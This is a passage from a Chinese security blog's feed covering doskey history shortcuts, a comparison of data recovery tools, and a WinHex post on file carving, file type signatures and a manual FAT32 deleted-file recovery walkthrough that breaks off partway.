title="快捷键命令"></a>快捷键命令</h2><p>F7快捷键查看所有执行过的命令</p><p>F3：调出上一条执行过的命令，调出后直接回车即可执行；</p><p>F8：搜索命令历史记录，和↑向上箭头类似。</p><p>F9：按编号选择命令，来调出执行过的命令：</p><p>命令号码在使用F7查看的时候可看到命令前边的数字即为命令号码，但是F7快捷键有个弊端，就是如果命令比较长就会显示不完全，分辨不出来命令的不同</p><p>本节参考：</p><p><a href="https://baike.baidu.com/item/doskey/10520881?fr=aladdin">https://baike.baidu.com/item/doskey/10520881?fr=aladdin</a></p><p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753867(v=ws.10)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753867(v=ws.10)?redirectedfrom=MSDN</a></p><p><a href="https://blog.csdn.net/lishuoboy/article/details/86605653">https://blog.csdn.net/lishuoboy/article/details/86605653</a></p><h1 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h1><p><a href="https://en.wikipedia.org/wiki/Command_history">https://en.wikipedia.org/wiki/Command_history</a></p><p><a href="https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Bash-History-Builtins">https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Bash-History-Builtins</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linux下命令行历史记录&quot;&gt;&lt;a href=&quot;#linux下命令行历史记录&quot; class=&quot;headerlink&quot; title=&quot;linux下命令行历史记录&quot;&gt;&lt;/a&gt;linux下命令行历史记录&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;原理的解释&lt;/strong&gt;&lt;/p&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D%E5%B7%A5%E5%85%B7%E6%80%A7%E8%83%BD%E5%AF%B9%E6%AF%94/"/>
    <id>https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D%E5%B7%A5%E5%85%B7%E6%80%A7%E8%83%BD%E5%AF%B9%E6%AF%94/</id>
    <published>2021-04-24T11:27:12.427Z</published>
    <updated>2021-04-24T11:27:18.161Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th>工具名</th><th>支持的系统</th><th>收费情况</th><th>支持挂恢复数据的格式</th></tr></thead><tbody><tr><td>UFS explorer professional recovery</td><td>win/mac/linux</td><td>收费</td><td>数据访问和恢复Windows: NTFS, FAT, FAT32, exFAT, ReFS/ReFS3;macOS: HFS+, APFS;Linux: Ext2, Ext3, Ext4, XFS, Extended format XFS, JFS, ReiserFS, UFS, UFS2, Adaptec UFS, big-endian UFS, Btrfs, F2FS;BSD/Solaris: ZFS volumes;VMware: VMFS, VMFS6.仅支持数据访问macOS: HFS;Novell: NWFS, NSS, NSS64;IBM/Microsoft: HPFS.</td></tr><tr><td>DiskGenius</td><td>win</td><td>收费</td><td>数据访问和恢复Windows: exFAT/GPT/NTFS（智能加载）Linux: EXT2/3/4（还支持分区恢复）虚拟磁盘</td></tr><tr><td>WinHEX</td><td>win</td><td>收费</td><td>数据访问和恢复Windows: FAT12/16/32/NTFS/exFATLinux: Ext2/3/4, 本机支持<a href="http://www.ctera.com/next3">Next3</a> ® , CDFS, UDF</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;工具名&lt;/th&gt;
&lt;th&gt;支持的系统&lt;/th&gt;
&lt;th&gt;收费情况&lt;/th&gt;
&lt;th&gt;支持挂恢复数据的格式&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;UFS explorer professional </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/"/>
    <id>https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/</id>
    <published>2021-04-24T11:25:30.612Z</published>
    <updated>2021-04-24T11:29:01.734Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/f14a41e8cfbe">https://www.jianshu.com/p/f14a41e8cfbe</a></p><p>官网 <a href="http://www.x-ways.com/index-c.html">http://www.x-ways.com/index-c.html</a></p><p>winhex <a href="http://www.x-ways.com/winhex/index-m.html">http://www.x-ways.com/winhex/index-m.html</a></p><p>WinHex：计算机取证和数据恢复软件，</p><p>十六进制编辑器和磁盘编辑器</p><p>Windows XP / 2003 / Vista / 2008/7/8 / 8.1 / 2012/10 / 2016，32位/ 64位*</p><h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><p>WinHex的核心是通用的十六进制编辑器，在<a href="http://www.x-ways.com/winhex/forensics.html">计算机取证</a>，<a href="http://www.x-ways.com/winhex/allfeatures.html#DataRecovery">数据恢复</a>，低级数据处理和IT安全领域特别有用。日常和紧急使用的高级工具：检查和编辑所有类型的文件，从文件系统损坏的硬盘驱动器或<a href="http://www.winhex.com/winhex/forum/messages/174/56.html">数码相机</a>卡中恢复已删除的文件或丢失的数据。功能<em>取决于许可证类型</em>（**<a href="http://www.x-ways.com/winhex/comparison.html">许可证类型比较</a>**），其中： </p><ul><li>硬盘，软盘，CD-ROM和DVD，ZIP，智能媒体，紧凑型闪存等的<a href="http://www.x-ways.com/pics/Disk_Editor.gif">磁盘编辑器</a>…</li><li>对于FAT12 / 16/32，exFAT的，NTFS和Ext2 / 3/4，本机支持<a href="http://www.ctera.com/next3">Next3</a> ® ，CDFS，UDF</li><li>RAID系统和动态磁盘的内置解释</li><li>各种数据恢复技术</li><li><a href="http://www.x-ways.com/pics/RAM_Editor.gif">RAM编辑器</a>，提供对物理RAM和其他进程的虚拟内存的访问</li><li><a href="http://www.x-ways.com/winhex/interpreter.html">数据解释器</a>，了解20种数据类型</li><li>使用<a href="http://www.x-ways.com/winhex/templates.html">模板</a>编辑数据结构 （例如，修复分区表/引导扇区）</li><li>串联和分割文件，统一和分割奇数和偶数字节/字</li><li><a href="http://www.x-ways.com/winhex/analysis.html">分析</a>和比较文件</li><li>特别灵活的搜索和替换功能</li><li><a href="http://www.x-ways.com/winhex/forensics.html#Cloning/Imaging">磁盘克隆</a> （在DOS下使用<a href="http://www.x-ways.com/replica.html">X-Ways副本</a>）</li><li>驱动器映像和备份（可选压缩或拆分为650 MB存档）</li><li><a href="http://www.x-ways.com/winhex/api/">编程接口</a>（API）和<a href="http://www.x-ways.com/winhex/scripting.html">脚本</a></li><li>256位AES加密，校验和，CRC32，哈希（MD5，SHA-1等）</li><li>安全擦除（擦除）机密文件，<a href="http://www.winhex.com/cgi-bin/discus/show.cgi?6/12.html">清理</a>硬盘 以保护您的隐私</li><li>导入所有剪贴板格式，包括 ASCII十六进制值</li><li>在二进制，十六进制ASCII，Intel十六进制和Motorola S之间进行转换</li><li>字符集：ANSI ASCII，IBM ASCII，EBCDIC，（Unicode）</li><li>即时窗口切换。印刷。随机数生成器。</li><li>支持任何大小的文件。非常快。易于使用。广泛的程序帮助。</li><li><strong><a href="http://www.x-ways.com/winhex/allfeatures.html">更多的</a></strong></li></ul><p>**<br>**</p><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a href="http://www.x-ways.net/winhex.zip">http://www.x-ways.net/winhex.zip</a></p><h1 id="用户手册"><a href="#用户手册" class="headerlink" title="用户手册"></a>用户手册</h1><p><a href="http://www.x-ways.com/winhex/manual.pdf">http://www.x-ways.com/winhex/manual.pdf</a></p><h3 id="关于数据恢复部分"><a href="#关于数据恢复部分" class="headerlink" title="关于数据恢复部分"></a>关于数据恢复部分</h3><h4 id="使用目录浏览器进行文件恢复"><a href="#使用目录浏览器进行文件恢复" class="headerlink" title="使用目录浏览器进行文件恢复"></a>使用目录浏览器进行文件恢复</h4><p>最明显的是，目录浏览器中列出的已删除文件和目录可以通过目录浏览器的上下文菜单轻松、有选择地恢复。导航到一个目录（或递归地浏览根目录），选择要恢复的文件，然后使用上下文菜单中的recover/Copy命令。参见“目录浏览器”一章。理想情况下，首先优化卷快照，以便在目录浏览器中找到并列出更多以前存在的文件。</p><h4 id="按类型-文件头签名搜索的文件恢复"><a href="#按类型-文件头签名搜索的文件恢复" class="headerlink" title="按类型/文件头签名搜索的文件恢复"></a>按类型/文件头签名搜索的文件恢复</h4><p>磁盘工具菜单中的数据恢复功能，以及查找以前存在的文件的策略（作为优化卷快照命令的一部分）。这种恢复方法也被称为“文件雕刻”。它搜索可由特征文件头签名（特定的字节值序列）识别的文件。由于这种方法，文件雕刻不依赖于功能文件系统结构的存在。</p><p>按类型恢复文件：根据文件头签名找到的文件将被雕刻并存储在您自己的驱动器上指定的输出文件夹中。（可选）将每种类型的恢复文件放入各自的子文件夹（…\JPEG，…\HTML等）。文件的假定内容实际上是复制的。</p><p>文件头签名搜索：根据文件头签名找到的文件不会存储在任何位置，而只是列在卷快照的专用虚拟目录中。只存储对文件的引用（人工生成的名称、假定大小、起始偏移量…）。当需要查看/复制文件时，可以动态地从原始磁盘/图像中读取文件内容。或者，您可以将文件从单独的文件头签名搜索操作输出到单独的子目录中，以便在需要时更容易区分它们。</p><p>请注意，文件雕刻通常假定连续的文件簇，因此如果文件最初以碎片方式存储，则会生成损坏的文件。存在以下例外情况：如果在具有除Ext2/Ext3以外的受支持文件系统的卷中进行文件头签名搜索时，在可用空间中的群集边界处发现文件的开头，则默认情况下，假定数据可能在文件系统标记为正在使用的群集之后流动。这将正确地重建在其他文件之后创建并存储在其他文件周围的文件，然后删除这些文件，只要发布的集群没有被重复使用并随后被覆盖。要防止文件以这种方式完全在可用空间中雕刻（即假定为连续簇），可以取消选择“围绕已用簇在可用簇中雕刻文件”选项。</p><p>选项“Ext2/Ext3块逻辑”使这种恢复方法也偏离了没有碎片的标准假设，因为它将遵循典型的Ext块模式，例如，文件头的第13块被认为是引用以下数据块的间接块。当应用于WinHex知道有Ext2和Ext3以外的文件系统的分区时，或者当发现头没有块对齐时，此选项不起作用。</p><p>日志文件“文件恢复方式”类型.log“有关所选参数和恢复结果的信息将写入输出文件夹以进行验证。</p><p>只需单击相应的按钮，即可在此对话框窗口中展开或折叠整个文件类型树。这很有用，因为展开时只需键入文件类型描述的前几个字符，即可自动跳转到树中的第一个匹配项。</p><p>由于不使用可能存在的（一致或损坏的）文件系统，因此此恢复方法基本上不知道原始文件大小，原始文件名也不知道。这就是为什么生成的文件通常按照以下模式进行命名：Prefix######.ext.“Prefix”是您提供的可选前缀。#####“是每个证据对象的递增数字。”ext”是根据文件类型定义对应于文件头签名的文件扩展名。输出文件名前缀可以选择包含占位符“%d”，该占位符将被驱动器名替换。如果您一次将文件恢复按类型应用于多个驱动器，并且希望能够轻松区分不同驱动器中的文件，则此功能非常有用。</p><p>如果有专家许可证或更高版本，“智能命名”选项将导致Exif JPEG文件以创建它们的数码相机型号及其内部时间戳（如果可用）命名。许多Windows注册表配置单元文件都有其原始名称，还有一些JPEG文件的元数据Photoshop中嵌入了一个名称。没有已知名称且没有Exif元数据的JPEG文件是由已知库创建的，它们会在括号中的人工名称中接收一些附加信息（请参见生成器签名）。拇指.db文件始终命名为拇指.db, 索引.dat总是索引.dat. 上述前缀不能与原始文件名一起使用。</p><p>各种算法在内部工作，试图确定许多不同类型文件的原始大小（其中包括JPEG、GIF、PNG、BMP、TIFF、尼康NEF、佳能CR2 raw、PSD、CDR、AVI、WAV、MOV、MPEG、MP3、MP4、3GP、M4V、M4A、ASF、WMV、WMA、ZIP、GZIP、RAR、7Z、TAR、MS Word、MS Excel、MS PowerPoint、RTF、PDF、HTML、XML、XSD、DTD、PST、，DBX，AOL PFC，Windows注册表，索引.dat，预取，SPL，EVTX，EML）通过检查它们的数据结构。这适用于文件类型定义数据库中页脚列中有“~”的条目。为了使大小和类型检测对这些文件类型起作用，不应更改这些条目。或者，页脚签名也可以帮助查找文件的结尾。对于既不存在内部算法也不存在页脚签名定义的文件，或可用内部算法不知道其原始大小的文件，以及实际找不到页脚签名的文件，将恢复为文件类型定义数据库中指定的默认大小（以字节为单位）。在指定这样的大小时要大方，因为恢复的文件“太大”仍然可以由其关联的应用程序打开，而过早截断的文件通常无法打开，因为它们是不完整的。通过搜索页脚来检测某些类型文件的原始大小的尝试受到大小检测限制，该限制也可以在数据库中指定，位于默认大小和正斜杠之后。这样的限制对于避免在整个卷内搜索给定文件的页脚是必要的，如果卷很大，这将非常耗时。此外，如果右页脚不在页眉附近，则越来越不可能找到右页脚，即使找到的页脚相距很远，这样的文件也可能是碎片或部分被覆盖等。标准默认大小（如果未指定）为1 MB。标准最大大小（如果未指定）是默认文件大小的64倍。</p><p>文件头通常位于集群边界，因为这是文件系统主要放置文件开头的地方。但是，搜索与扇区对齐的文件头更彻底（而不是更慢），因为这样还可以从以前存在的分区中找到具有不同群集布局的文件，因此在扇区边界处搜索是默认行为。如果在没有定义集群布局的物理介质或原始文件上执行，WinHex必须在扇区边界进行搜索。还有另一种可能性，彻底的字节级搜索。当您试图查找在任何扇区边界上没有可靠对齐的文件（例如，备份文件或磁带映像中的文件或嵌入其他文件中的文件）或试图查找条目/记录/微格式/内存工件等（即不完整的普通文件）时，这是必需的。这是以可能增加误报次数为代价的，但是，错误识别的文件签名随机出现在媒体上，并不表示文件的开头。文件类型定义数据库中的单个标志可以帮助确定在每个文件类型的基础上搜索哪些文件的群集、扇区或字节边界。</p><p>卷快照已知的文件的起始扇区始终从文件雕刻中排除是可选的。当然，X-Ways取证通常仍然试图防止重复，但是如果文件头签名定义或内部文件大小检测足够强，表明已知删除的文件被新文件覆盖，那么新文件将被雕刻，尽管它与已知文件共享相同的起始扇区。另一个例外是，在文件头签名搜索中不会忽略完全未初始化文件（有效数据长度=0）的第一个扇区。</p><p>如果您有意中止文件头签名搜索，或者如果文件头签名搜索导致X-Ways Forensics崩溃，则下次在同一证据对象中启动文件头签名搜索时，您将找到一个选项，可以在中断的位置或上次保存卷快照时的位置恢复该搜索发生崩溃（取决于案例的自动保存间隔）。</p><p>如果需要，可以将恢复范围限制为当前选定的块和/或已分配或未分配的空间（逻辑驱动器或卷上提供的选项）。例如，要恢复已删除的文件，请选择仅从未分配的空间恢复。由于文件系统错误而无法访问的文件可能仍存储在被视为正在使用的集群中。</p><p>NTFS压缩对文件数据的影响可以选择在文件头签名搜索（仅限法医许可证）中进行补偿，在许多情况下是成功的。如果找到NTFS压缩文件的签名，则该文件将被标记为已压缩，并且在需要时将尝试“动态”解压缩该文件，该算法甚至可以解压缩由多个压缩单元组成的文件。</p><h4 id="文件类型定义"><a href="#文件类型定义" class="headerlink" title="文件类型定义"></a>文件类型定义</h4><p>“文件类型签名*.txt”是以制表符分隔的文本文件，用作优化卷快照和按类型恢复文件命令的文件类型定义数据库。</p><p>WinHex附带了各种预设的文件类型签名。您可以在“文件类型签名”中完全自定义文件类型定义并添加自己的定义搜索.txt“或任何其他格式相同的文件名为“文件类型签名*.txt”，它也将被加载，并且可能有这样的好处：如果它们与默认文件的名称不同，那么在安装下一个更新时它们不会被覆盖。只有当文件名包含单词“search”时，文件类型才可用于文件头签名搜索。否则，它们仅用于已是卷快照一部分的文件的文件类型验证（仅限取证许可证）。总共支持多达4096个条目（1024个用于搜索）。</p><p>单击“自定义”按钮编辑“文件类型签名”文件时搜索.txt，默认情况下，WinHex在MS Excel中打开文件。这很方便，因为该文件包含由制表符分隔的列。如果使用文本编辑器编辑文件，请确保保留这些选项卡，因为WinHex依赖它们的存在来正确解释文件类型定义。MS Excel会自动保留它们。编辑文件类型定义后，需要退出对话框窗口并再次调用“按类型恢复文件”或“优化卷快照”菜单命令，以查看文件类型列表中的更改。</p><h5 id="第1列：文件类型"><a href="#第1列：文件类型" class="headerlink" title="第1列：文件类型"></a>第1列：文件类型</h5><p>一种可读的文件类型名称，例如“JPEG”。超过前19个字符的所有内容都将被忽略。</p><h5 id="第2列：扩展"><a href="#第2列：扩展" class="headerlink" title="第2列：扩展"></a>第2列：扩展</h5><p>通常用于此文件类型的一个或多个文件类型扩展名。例如“jpg；jpeg；jpe”。首先指定最常用的扩展名，因为默认情况下，该扩展名将用于命名恢复的文件。如果第一个扩展名是用大写字符指定的，则文件类型验证将使用该扩展名填充文件的类型列，即使该文件有一个可选的合理的文件扩展名。支持超过255个字符。</p><h5 id="第3列：标题"><a href="#第3列：标题" class="headerlink" title="第3列：标题"></a>第3列：标题</h5><p>唯一的头签名，通过它可以识别此文件类型的文件。它是用GREP语法指定的（请参阅搜索选项以获取解释），因此可以匹配可变字节值（例如，[\xE1\xE2]表示“字节值可以是0xE1或0xE2”）或未定义区域（.）。表示的签名的最大长度为48字节。要首先找出特征文件头签名，请在WinHex中打开几个特定类型的现有文件，并在文件开头附近的相同偏移量处查找公共字节值。</p><h5 id="第4列：偏移"><a href="#第4列：偏移" class="headerlink" title="第4列：偏移"></a>第4列：偏移</h5><p>文件中签名出现的相对偏移量。通常只是0。签名必须包含在前512字节中。</p><h5 id="第5列：页脚"><a href="#第5列：页脚" class="headerlink" title="第5列：页脚"></a>第5列：页脚</h5><p>可选。用GREP语法指定的一种可靠地表示文件结尾的签名（字节序列）。表示可变大小数据的GREP表达式可能无法按预期工作。页脚签名可能有助于实现具有正确文件大小的恢复。恢复算法不会从页眉开始搜索超过指定为最大文件大小的字节数的页脚。</p><p>甚至比页脚更好的是，XWays Forensics内部实现的算法的潜在可用性，该算法非常了解文件格式，如果文件没有碎片、不完整或损坏，通常可以找出正确的文件大小。这种算法在页脚列中用波浪号（~）和算法ID号表示。</p><h5 id="第6列：默认大小"><a href="#第6列：默认大小" class="headerlink" title="第6列：默认大小"></a>第6列：默认大小</h5><p>可选。1或2个值。如果有两个值，则第二个值是特定于文件类型的大小检测限制，并用正斜杠与默认大小分隔。</p><h5 id="第7列：旗帜"><a href="#第7列：旗帜" class="headerlink" title="第7列：旗帜"></a>第7列：旗帜</h5><p>可选。可以进一步定制特定文件类型的文件雕刻，是另一个如何复杂和强大的文件雕刻在X-Ways取证指标。</p><p>答：这意味着一个定义严重依赖于相关的算法（用~字符定义的算法），没有它就太通用了。</p><p>b（小写）：在给定选项时，在字节级搜索签名。特别适用于通常不在任何扇区或集群边界对齐的条目/记录/微格式/内存工件（即不完整的普通文件）。</p><p>B（大写）：出于性能原因，阻止对特定签名进行字节级搜索。</p><p>c（小写）：如果考虑（取决于用户界面设置），则忽略在集群边界处未对齐的头签名。对于某些文件类型可能很有用，以避免许多误报。</p><p>C（大写）：表示不应用于搜索NTFS压缩文件的文件类型签名（如果NTFS压缩补偿处于活动状态），因为它们太弱，会产生太多误报，或者实际上不会存储为压缩文件。</p><p>d（小写，表示“direct”）：签名将按字面解释，而不是按GREP表达式，逐字符解释，字节值根据Windows系统中的活动代码页。例如，如果您对GREP表示法不是很熟悉，或者不需要GREP，只想根据Windows系统中活动的代码页对所有字符进行逐字解释，而不必考虑字符在GREP中是否被视为特殊字符，那么这将非常有用。例如，&lt;？xml version=“1”是某些xml文件的有效签名，但它仅与direct标志一起使用，因为问号在GREP中有特殊的含义，如果整个表达式被解释为GREP，则会在内部为签名生成不同的字节值序列；如果GREP解释处于活动状态，则不会生成任何匹配项。</p><p>e:代表“嵌入式”。如果某个文件类型在页脚列中具有波浪号（~）算法，并用此标志进行了标记，则在卷快照优化期间，在“在上面未处理的所有文件中搜索文件头签名”部分中，将预先选择该文件类型以搜索某些其他文件中的嵌入数据。“e”标志仅帮助初始化此选项的记号。最终，用户可以在用户界面中更改该操作的选定文件类型。此外，将搜索嵌入到不存在内部提取算法的类型文件中的标有“e”标志的类型。</p><p>E:从不在其他文件中作为嵌入文件进行雕刻。</p><p>f（小写）：表示指定的页脚签名用于查找不再属于文件的一部分且应排除的数据。普通的页脚包含在雕刻文件中。对于没有良好定义的页脚的文件格式非常有用，在这种格式中，可以通过出现不再属于该文件的数据来检测文件的结尾。这可以是与头相同的签名（如果该类型的文件通常以组的形式出现，则是背对背的），也可以是\x00（对于不包含零值字节的文本文件等文件格式，其中\x00在RAM slack中的可能性很高）。此类页脚签名应标记为独占，因为与其匹配的数据不是文件本身的一部分。</p><p>F（大写）：如果在定义中指定了页脚签名，则如果找不到相应的页脚，则使X-Ways取证放弃对文件头签名搜索的命中。有助于减少或完全避免误报。</p><p>代表“贪婪”。贪婪地分配所有的部门。文件类型签名搜索仅在假定的文件结束后继续搜索其他文件头。如果有一个内部实现的算法可以确保雕刻的文件包含所有有效的数据，这样就不必在先前雕刻的文件的边界内搜索其他文件，那么这个算法将非常有用。只有在扇区边界处找到文件头签名时，该标志才有效。如果空闲空间中的文件是围绕分配的集群划分的，则在搜索进一步的文件头签名时，只跳过文件的第一个片段。</p><p>g（小写）：同一标志的较弱版本。只有当文件类型存在内部文件大小检测算法，并且具有相同起始扇区号的文件已经存在，并且具有与检测到的相同的文件大小时，“g”标志才会导致X-Ways取证跳过受影响的扇区。这有助于防止zip文件重叠，从而避免可能包含许多重复文件。</p><p>h：表示指定的头签名用于查找不属于文件本身的数据。这意味着头签名将从雕刻文件中排除。雕刻文件将在头签名后开始。此外，此标志防止在为此类文件分配的群集周围的可用空间中进行文件雕刻。</p><p>H:该定义仅用于签名突出显示功能，不用于常规的文件头签名搜索或文件类型验证。这样的定义只需要三条信息：关键字或GREP表达式、相对偏移量（通常为0）和标志“H”。行开头的描述是可选的，但建议使用，因为颜色取决于描述，对于不同的描述，您可能会看到不同的颜色。您甚至可以创建一个专用的文本文件，例如名为“文件类型签名搜索”突出显示.txt，它定义了各种您始终感兴趣的关键字或GREP表达式，并希望在每次运行适当的搜索之前立即突出显示这些关键字或表达式。如果您分析或逆向工程文件格式，例如记录没有固定长度（因此WinHex中的记录表示选项不适用），但可以通过签名来识别，也很有用。</p><p>L:标识仅链接到其他定义的链接。例如，有一个OpenOffice文件条目很有用，但有些用户没有该条目，如果缺少该条目，可能会导致错误的想法，即无法雕刻OpenOffice文件。如果选择了OpenOffice的条目进行雕刻，则会在内部自动选择zip存档进行雕刻，这是有意义的，因为从技术上讲，OpenOffice文件是zip文件，可以这样雕刻。缺点是其他不是OpenOffice文件的zip文件也会被雕刻。</p><p>但是，由于内部文件类型检测（例如基于自动分配的文件扩展名），这些文件将是可区分的。</p><p>S：标记足以用于文件头签名搜索（可能与雕刻算法结合使用）的签名，但由于偶尔的错误识别而不能用于文件类型验证。这个旗子应该很少需要。</p><p>t:防止X-Ways取证人员在确认后立即呈现雕刻文件的类型。例如，对于XML等文件格式族非常有用，可以在以后的文件类型验证过程中确定确切的子类型。</p><p>u（小写）：表示“未使用”。允许雕刻文件只在集群是免费的，根据文件系统。</p><p>U（大写）：仅允许在集群中雕刻文件，这些集群根据文件系统是免费的，并且卷快照中包含的以前存在的文件也不使用这些集群。</p><p>W（大写）：标识头签名，这些头签名太弱，无法新检测文件的类型，仅用于确认文件扩展名建议的类型。</p><p>x:标识实际文件扩展名不是该文件类型的标准扩展名这一相对正常的文件类型，这样在文件类型验证后，这些类型的文件不会突出显示为“检测到不匹配”，而只是显示为“新标识”，以免引起人们对这些文件的过分关注。</p><p>y：标识已知在内部使用加密的文件类型，允许在Attr中标记这些类型的雕刻文件。立即用“e！”列。</p><h4 id="手动数据恢复"><a href="#手动数据恢复" class="headerlink" title="手动数据恢复"></a>手动数据恢复</h4><p>可以恢复丢失或逻辑删除的文件（或更一般的：数据），这些文件在文件系统中仅标记为已删除，但尚未被物理擦除（或覆盖）。</p><p>使用磁盘编辑器打开已删除文件所在的逻辑驱动器。基本上，您可以通过选择分配给文件的磁盘扇区作为当前块并使用菜单命令“编辑|复制块|保存到新文件”来重新创建这样的文件。但要找到文件仍然存储的扇区可能很困难。通常有两种方法来实现这一点：</p><p>\1.  如果您知道要查找的文件的某个片段（例如JPEG文件头中的特征签名或MS Word文档中的“亲爱的史密斯先生”），请使用其中一个搜索命令（例如“查找文本”或“查找十六进制值”）在磁盘上搜索它。这是一个非常简单和可靠的方法。</p><p>\2.  如果您只知道文件名，则需要了解磁盘上的文件系统（FAT16、FAT32、NTFS…），以便找到以前的目录条目或定义文件的其他数据结构的痕迹，从而确定分配给文件的第一个群集的数目。</p><p>您可能会遇到这样的问题：要恢复的文件是碎片化的，即没有存储在后续连续的集群中。在FAT文件系统中，可以在驱动器开头的文件分配表中查找文件的下一个群集，但删除文件时会删除此信息。</p><h3 id="手工数据恢复案例"><a href="#手工数据恢复案例" class="headerlink" title="手工数据恢复案例"></a>手工数据恢复案例</h3><p>这里我们参考<a href="https://www.jianshu.com/p/88a9ea4055c7">https://www.jianshu.com/p/88a9ea4055c7</a></p><h4 id="FAT32"><a href="#FAT32" class="headerlink" title="FAT32"></a>FAT32</h4><h5 id="FAT32逻辑磁盘基本信息描述"><a href="#FAT32逻辑磁盘基本信息描述" class="headerlink" title="FAT32逻辑磁盘基本信息描述"></a>FAT32逻辑磁盘基本信息描述</h5><p>用winhex打开一个FAT32分区格式的逻辑盘F盘，查看该逻辑盘的根目录区。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365574504-468ad296-ed88-41b5-ab53-141738a90616-20210424192610973.png" class="" title="image.png"><p>逻辑盘BPB</p><p>其中0200（蓝框）表示一个扇区512个字节，08（红框）表示每簇8个扇区，即每簇4kb。（查阅资料可得，FAT32分区当分区大小在260MB-8GB时，簇大小为4KB，符合事实）这里由F盘大小5GB及在FAT表中每簇占4个字节的记录可计算得每个FAT（FAT2为FAT1的备份）大小为5MB，与实际相同。</p><p>在F盘根目录下创建一个大概60kb的文本文档。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365605070-f9e12cbc-7583-4b8f-b993-0224c1aceab3-20210424192609073.png" class="" title="image.png"><p>创建文件</p><p>在winhex找到该文件位置，查看目录项的信息。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365613573-e56b2e4d-898e-4b4a-87ba-ea858635c9d6-20210424192612758.png" class="" title="image.png"><p>文件目录项</p><p>由红框内目录项信息可分别知道首簇号高四位和第四位进而求得首簇号为10号，以及文件大小。经计算可得文件大小为58.9kb近似为文件大小。又因为每簇4kb，故共需15簇。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365619676-ed7370ea-0417-484e-bd9a-150c7883025f-20210424192608882.png" class="" title="image.png"><p>fat1（正常）</p><p>从第10号开始，形成一个簇链，直到FFFFFF0F结束。</p><h5 id="FAT32数据恢复过程"><a href="#FAT32数据恢复过程" class="headerlink" title="FAT32数据恢复过程"></a>FAT32数据恢复过程</h5><p>将刚才的test.txt文件永久删除。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365622731-eb9977bc-ee12-4243-a1f9-5f48ca6a765a-20210424192609422.png" class="" title="image.png"><p>删除文件</p><p>找到文件目录项，修改对应第一位信息，并由目录项簇号信息及文件大小计算出首簇号为10，簇数为15。</p><p><img src="WinHEX(win)/1617365639055-6bfcadce-12eb-40d7-8eb5-0e0f6d57deb5-20210424192611710.png" alt="image.png"><img src="WinHEX(win)/1617365639667-f479b777-436b-4407-8322-761d25108b5f-20210424192610213.png" alt="image.png"><img src="WinHEX(win)/1617365639822-16bb90c9-d325-4c03-b255-3ed08bacfcd1-20210424192611537.png" alt="image.png"><img src="WinHEX(win)/1617365639956-eba75652-3f0e-4bad-a230-39ca45a9bc4a-20210424192613374.png" alt="image.png"></p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365641328-0602c20a-efa4-46f6-812b-dd0b7727c303-20210424192610792.png" class="" 